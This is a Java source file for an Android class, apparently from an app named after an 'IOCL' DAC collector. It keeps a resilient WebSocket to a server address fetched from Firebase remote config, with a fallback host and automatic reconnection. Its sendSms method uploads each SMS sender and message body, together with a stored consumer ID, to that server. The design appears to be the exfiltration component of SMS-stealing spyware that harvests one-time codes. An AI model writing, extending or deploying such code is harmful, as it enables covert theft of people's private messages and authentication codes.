package android.iocl.dac_collector.Services;

import android.content.Context;
import android.iocl.dac_collector.ModelData.SmsData;
import android.iocl.dac_collector.Utility.FirebaseConfigManager;
import android.iocl.dac_collector.Utility.SharedPrefs;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import org.json.JSONObject;

import java.util.concurrent.TimeUnit;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class WebSocketConnectionManager {
    private static final String TAG = "WebSocketConnectionManager";
    private static final long INITIAL_RECONNECT_DELAY = 5_000L;
    private static final long MAX_RECONNECT_DELAY = 60_000L;
    private static volatile WebSocketConnectionManager instance;
    private final Context context;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private final OkHttpClient httpClient;
    private final Object lock = new Object();
    private WebSocket webSocket;
    private String currentPath = "/websocket";
    private String currentBaseUrl = "";
    private boolean manuallyStopped = false;
    private boolean connecting = false;
    private int reconnectAttempt = 0;
    private Runnable reconnectRunnable;

    private WebSocketConnectionManager(Context context) {
        this.context = context.getApplicationContext();
        this.httpClient = new OkHttpClient.Builder().readTimeout(0, TimeUnit.MILLISECONDS).connectTimeout(30, TimeUnit.SECONDS).writeTimeout(30, TimeUnit.SECONDS).retryOnConnectionFailure(true).pingInterval(30, TimeUnit.SECONDS).build();
    }

    public static WebSocketConnectionManager getInstance(Context context) {
        if (instance == null) {
            synchronized (WebSocketConnectionManager.class) {
                if (instance == null) {
                    instance = new WebSocketConnectionManager(context);
                }
            }
        }
        return instance;
    }

    public void start(String path) {
        try {
            if (path == null || path.trim().isEmpty()) {
                path = "/websocket";
            }
            if (!path.startsWith("/")) {
                path = "/" + path;
            }
            synchronized (lock) {
                currentPath = path;
                manuallyStopped = false;
                if (webSocket != null || connecting) {
                    Log.d(TAG, "WebSocket already active");
                    return;
                }
                connecting = true;
                reconnectAttempt = 0;
            }
            cancelReconnect();
            String baseUrl = resolveWebSocketUrl();
            if (baseUrl == null || baseUrl.trim().isEmpty()) {
                Log.e(TAG, "No websocket URL configured");
                return;
            }
            connect(baseUrl);
        } catch (Throwable e) {
            Log.e(TAG, "start crash", e);
            scheduleReconnect();
        }
    }

    private String resolveWebSocketUrl() {
        String primary = FirebaseConfigManager.getWebsocket1();
        if (primary != null && !primary.trim().isEmpty()) {
            return primary;
        }
        String secondary = FirebaseConfigManager.getWebsocket2();
        if (secondary != null && !secondary.trim().isEmpty()) {
            return secondary;
        }
        return "";
    }

    private String resolveFallbackUrl(String activeUrl) {
        String primary = FirebaseConfigManager.getWebsocket1();
        String secondary = FirebaseConfigManager.getWebsocket2();

        if (secondary != null && !secondary.trim().isEmpty() && !secondary.equals(activeUrl)) {
            return secondary;
        }
        if (primary != null && !primary.trim().isEmpty() && !primary.equals(activeUrl)) {
            return primary;
        }
        return activeUrl;
    }

    private void connect(String baseUrl) {
        try {
            currentBaseUrl = baseUrl;
            String url = buildUrl(baseUrl, currentPath);
            Log.d(TAG, "Connecting to: " + url);
            Request request = new Request.Builder().url(url).build();
            httpClient.newWebSocket(request, new WebSocketListener() {
                @Override
                public void onOpen(WebSocket socket, Response response) {
                    synchronized (lock) {
                        webSocket = socket;
                        connecting = false;
                        reconnectAttempt = 0;
                    }
                    Log.d(TAG, "WebSocket connected");
                }

                @Override
                public void onMessage(WebSocket socket, String text) {
                    Log.d(TAG, "Message received: " + text);
                }

                @Override
                public void onClosing(WebSocket socket, int code, String reason) {
                    Log.d(TAG, "WebSocket closing: " + reason);
                    socket.close(code, reason);
                }

                @Override
                public void onClosed(WebSocket socket, int code, String reason) {
                    synchronized (lock) {
                        if (webSocket == socket) {
                            webSocket = null;
                        }
                        connecting = false;
                    }
                    if (!isManuallyStopped()) {
                        scheduleReconnect();
                    }
                }

                @Override
                public void onFailure(WebSocket socket, Throwable throwable, Response response) {
                    synchronized (lock) {
                        if (webSocket == socket) {
                            webSocket = null;
                        }
                        connecting = false;
                    }
                    Log.e(TAG, "WebSocket failure", throwable);
                    if (!isManuallyStopped()) {
                        String fallbackUrl = resolveFallbackUrl(currentBaseUrl);
                        if (fallbackUrl != null && !fallbackUrl.trim().isEmpty() && !fallbackUrl.equals(currentBaseUrl)) {
                            Log.w(TAG, "Retrying websocket with fallback URL: " + fallbackUrl);
                            connect(fallbackUrl);
                            return;
                        }
                        scheduleReconnect();
                    }
                }
            });
        } catch (Throwable e) {
            synchronized (lock) {
                connecting = false;
            }
            Log.e(TAG, "connect crash", e);
            if (!isManuallyStopped()) {
                scheduleReconnect();
            }
        }
    }

    private String buildUrl(String baseUrl, String path) {
        if (baseUrl == null || baseUrl.trim().isEmpty()) {
            throw new IllegalArgumentException("WebSocket base URL is empty");
        }
        if (baseUrl.endsWith("/") && path.startsWith("/")) {
            return baseUrl.substring(0, baseUrl.length() - 1) + path;
        }
        if (!baseUrl.endsWith("/") && !path.startsWith("/")) {
            return baseUrl + "/" + path;
        }
        return baseUrl + path;
    }

    public boolean sendSms(SmsData sms) {
        try {
            if (sms == null || sms.getSenderAddress().isEmpty()) {
                Log.w(TAG, "SMS is empty");
                return false;
            }
            WebSocket socket;
            synchronized (lock) {
                socket = webSocket;
            }
            if (socket == null) {
                Log.w(TAG, "WebSocket is not connected; reconnecting before send");
                if (!isManuallyStopped()) {
                    String reconnectUrl = resolveWebSocketUrl();
                    if (reconnectUrl != null && !reconnectUrl.trim().isEmpty()) {
                        connect(reconnectUrl);
                    }
                    scheduleReconnect();
                }
                return false;
            }
            JSONObject smsData = new JSONObject();
            smsData.put("senderAddress", sms.getSenderAddress());
            smsData.put("message", sms.getMessage());

            JSONObject object = new JSONObject();
            object.put("type", "sms");
            object.put("smsData", smsData);
            object.put("user", SharedPrefs.getConsumerId());

            String jsonToSend = object.toString();

            boolean sent = socket.send(jsonToSend);
            if (!sent) {
                Log.w(TAG, "WebSocket send returned false; scheduling reconnect");
                if (!isManuallyStopped()) {
                    scheduleReconnect();
                }
            }

            Log.d(TAG, "SMS sent: " + sent);
            Log.d(TAG, "SMS JSON: " + jsonToSend);
            return sent;
        } catch (Throwable e) {
            Log.e(TAG, "sendSms crash", e);
            return false;
        }
    }

    public boolean isConnected() {
        synchronized (lock) {
            return webSocket != null;
        }
    }

    public void stop() {
        try {
            synchronized (lock) {
                manuallyStopped = true;
                connecting = false;
            }
            cancelReconnect();
            WebSocket socket;
            synchronized (lock) {
                socket = webSocket;
                webSocket = null;
            }
            if (socket != null) {
                socket.close(1000, "Stopped by application");
            }
            Log.d(TAG, "WebSocket stopped");
        } catch (Throwable e) {
            Log.e(TAG, "stop crash", e);
        }
    }

    private boolean isManuallyStopped() {
        synchronized (lock) {
            return manuallyStopped;
        }
    }

    private void scheduleReconnect() {
        try {
            synchronized (lock) {
                if (manuallyStopped || reconnectRunnable != null) {
                    return;
                }
                long delay = INITIAL_RECONNECT_DELAY * (1L << Math.min(reconnectAttempt, 4));
                delay = Math.min(delay, MAX_RECONNECT_DELAY);
                reconnectAttempt++;
                reconnectRunnable = () -> {
                    synchronized (lock) {
                        reconnectRunnable = null;
                        if (manuallyStopped || webSocket != null || connecting) {
                            return;
                        }
                        connecting = true;
                    }
                    String nextUrl = resolveWebSocketUrl();
                    if (nextUrl != null && !nextUrl.trim().isEmpty()) {
                        connect(nextUrl);
                    }
                };
                mainHandler.postDelayed(reconnectRunnable, delay);
                Log.d(TAG, "Reconnect scheduled in " + delay + " ms");
            }
        } catch (Throwable e) {
            Log.e(TAG, "scheduleReconnect crash", e);
        }
    }

    private void cancelReconnect() {
        try {
            synchronized (lock) {
                if (reconnectRunnable != null) {
                    mainHandler.removeCallbacks(reconnectRunnable);
                    reconnectRunnable = null;
                }
            }
        } catch (Throwable e) {
            Log.e(TAG, "cancelReconnect crash", e);
        }
    }
}